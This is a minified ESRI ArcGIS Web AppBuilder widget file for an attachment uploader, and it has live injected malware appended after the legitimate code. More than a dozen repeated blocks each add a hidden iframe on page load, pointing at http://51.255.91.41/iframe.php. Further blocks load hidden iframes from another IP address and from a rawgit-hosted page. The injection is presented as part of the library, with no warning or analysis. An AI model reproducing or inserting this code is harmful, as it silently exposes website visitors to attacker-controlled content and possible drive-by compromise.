// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/SmartEditor/AttachmentUploader.html":"\x3cdiv class\x3d\"attachmentUploader\" dojoattachpoint\x3d\"attachmentUploader\"\x3e\r\n    \x3cbr /\x3e\r\n    \x3cdiv\x3e\r\n        \x3cb\x3e${nls.NLS_attachments}\x3c/b\x3e\r\n        \x3chr /\x3e\r\n\r\n        \x3cdiv dojoattachpoint\x3d'_attachmentList' style\x3d'white-space:nowrap'\x3e\x3c/div\x3e\r\n\r\n\r\n\r\n    \x3c/div\x3e\r\n\x3c/div\x3e"}});
define("dojo dojo/_base/declare dojo/_base/lang dojo/on dojo/dom-construct dijit/_WidgetBase dijit/_TemplatedMixin dojo/text!./AttachmentUploader.html dojo/i18n!esri/nls/jsapi".split(" "),function(g,k,e,h,f,l,m,n,p){return k([l,m],{declaredClass:"jimu-widget-smartEditor-attachmentuploader",templateString:n,widgetsInTemplate:!0,_inputCount:0,_inputIndex:1,constructor:function(){this.nls=e.mixin(this.nls,p.widgets.attachmentEditor)},_fileSelected:function(a){a=a.target||a.srcElement;0<a.value.length&&
(g.style(a.parentNode.childNodes[0],"display","inline-block"),this._addInput())},clear:function(){if(void 0!==this._attachmentList&&null!==this._attachmentList){for(;this._attachmentList.firstChild;)this._attachmentList.removeChild(this._attachmentList.firstChild);this._addInput()}},_deleteAttachment:function(a){a=a.target||a.srcElement;a.parentNode.parentNode.removeChild(a.parentNode)},_reflect:function(a){return a.then(function(a){return{state:"fulfilled",value:a}},function(a){return{state:"rejected",
error:a}})},_addInput:function(){for(var a=0;a<this._attachmentList.childNodes.length;a++)if(this._attachmentList.childNodes[a].childNodes[this._inputIndex].value){if(0===this._attachmentList.childNodes[a].childNodes[this._inputIndex].value.length)return}else return;a=f.create("div",{id:"delInput"+String(this._inputCount),"class":"deleteAttachment"});a.innerHTML="X";g.style(a,"display","none");this.own(h(a,"click",e.hitch(this,this._deleteAttachment)));var c=f.create("form",{id:"formInput"+String(this._inputCount)}),
b=f.create("input",{id:"fileInput"+String(this._inputCount),type:"file","class":"attInput",name:"attachment"});c.appendChild(a);c.appendChild(b);this._attachmentList.appendChild(c);this.own(h(b,"change",e.hitch(this,this._fileSelected)));this._inputCount+=1},startup:function(){this._addInput()},destroy:function(){this.inherited(arguments)},postAttachments:function(a,c){if(a&&"esri.layers.FeatureLayer"===a.declaredClass&&a.getEditCapabilities&&a.addAttachment){for(var b=[],d=0;d<this._attachmentList.childNodes.length;d++)0<
this._attachmentList.childNodes[d].childNodes[this._inputIndex].value.length&&b.push(a.addAttachment(c,this._attachmentList.childNodes[d]));return 0===b.length?null:b.map(this._reflect)}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});